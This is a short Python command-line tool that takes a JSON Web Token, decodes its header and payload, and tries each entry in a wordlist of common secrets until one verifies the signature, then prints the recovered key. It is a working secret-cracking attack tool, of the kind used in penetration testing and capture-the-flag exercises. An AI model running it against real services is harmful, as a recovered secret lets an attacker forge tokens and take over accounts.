import base64
import json
import sys

import jwt

from modules import ArgParser


def decode_b64(b64str) -> str:
    b64str = b64str + '='*(-len(b64str) % 4)
    b64str = base64.b64decode(b64str).decode()
    return json.loads(b64str)


def breaker(encoded_jwt: str, verbose: bool = False) -> str:
    # encoded_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIifQ.p5LogGsW6l9h-xwx_QD8u61gpRTJnnQQvLl1dOVGQWQ"

    header_b64, payload_b64, signature_b64 = encoded_jwt.split('.')
    header = decode_b64(header_b64)
    if verbose:
        payload = decode_b64(payload_b64)
        print('\n Header:   ', header_b64)
        print('  - Decode:', header)
        print(' Payload:  ', payload_b64)
        print('  - Decode:', payload)
        print(' Signature:', signature_b64)
    # RFC 7518 - Alg List: https://tools.ietf.org/html/rfc7518#section-3
    algorithm = header.get('alg', '')

    filename = 'common_secrets.txt'

    with open(filename, 'r') as file:
        secrets = file.readlines()

    if verbose:
        print()

    last_secret = ''

    for secret in secrets:
        if secret.endswith('\n'):
            secret = secret[:-1]
        try:
            jwt.decode(encoded_jwt, secret,
                       algorithms=['RS256', 'HS256', algorithm])
            if verbose:
                print('\r Secret:', secret, end=' '*len(last_secret)+'\n')
            return secret
        except Exception as error:
            if verbose:
                print('\r Secret:', secret, end=' '*len(last_secret))
        last_secret = secret

    return ''


def arguments_parser() -> str:
    arg_parser = ArgParser()
    rules = {'pairs': {'JWT': ['-jwt', '--jwt', '-t', '--token']}}
    arguments, _ = arg_parser.parser(rules, sys.argv, wn=True)
    return arguments


def get_jwt(arguments: dict):
    JWT = arguments.get('JWT')
    assert JWT, "\n El argumento JWT Es Necesario."
    return JWT[1]


if __name__ == '__main__':
    arguments = arguments_parser()
    JWT = get_jwt(arguments)
    secret = breaker(JWT)
    if not secret:
        print("\n [-] Secret Not Found!")
    else:
        print(f"\n [+] Secret: {repr(secret)}")
